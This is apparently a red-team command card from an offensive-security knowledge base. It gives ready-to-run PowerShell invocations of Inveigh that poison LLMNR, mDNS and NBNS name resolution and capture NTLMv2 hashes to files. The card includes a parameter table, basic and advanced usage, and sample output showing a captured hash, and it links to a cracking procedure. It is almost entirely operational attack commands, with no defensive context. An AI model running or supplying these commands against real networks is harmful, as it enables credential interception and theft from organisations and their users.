---
type: command
executor: powershell
data: >-
  Invoke-Inveigh -IP $_ATTACKER_IP -ConsoleOutput Y -FileOutput Y -NBNS Y -mDNS
  Y -Proxy Y -MachineAccounts Y
tags:
  - poisoning
  - llmnr
  - ntlm
platforms:
  - Windows
verified: true
validated: true
---

# invoke-inveigh-run-poisoning

## Command

```powershell
Invoke-Inveigh -IP $_ATTACKER_IP -ConsoleOutput Y -FileOutput Y -NBNS Y -mDNS Y -Proxy Y -MachineAccounts Y
```

## Description

Invokes the Inveigh PowerShell script to perform LLMNR/mDNS/NBNS spoofing and capture NTLMv2 hashes in memory or to files.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| -IP | Attacker IP for binding (optional) | No |
| $_ATTACKER_IP | IP address to bind to | No |
| -ConsoleOutput | Enables console logging (Y/N) | No |
| -FileOutput | Enables file logging (Y/N) | No |
| -NBNS | Enables NBNS spoofing (Y/N) | No |
| -mDNS | Enables mDNS spoofing (Y/N) | No |
| -Proxy | Enables proxy auth (Y/N) | No |
| -MachineAccounts | Targets machine accounts (Y/N) | No |

## Examples

### Basic Usage

```powershell
Invoke-Inveigh -ConsoleOutput Y -FileOutput Y -NBNS Y -mDNS Y
```

### Advanced Usage

```powershell
Invoke-Inveigh -IP 10.10.10.10 -ConsoleOutput Y -FileOutput Y -NBNS Y -mDNS Y -Proxy Y
```

## Expected Output

```
[*] Inveigh Started
[*] [NBT-NS] Poisoner Active
[+] [HTTP] NTLMv2 Hash: user::DOMAIN:challenge:hash:...
```
Hashes exported to Inveigh-Hashes.txt.

## Related

- [[procedures/Net-NTLMv2-Hash-Capture-and-Cracking]]
- [[tools/Empire]]
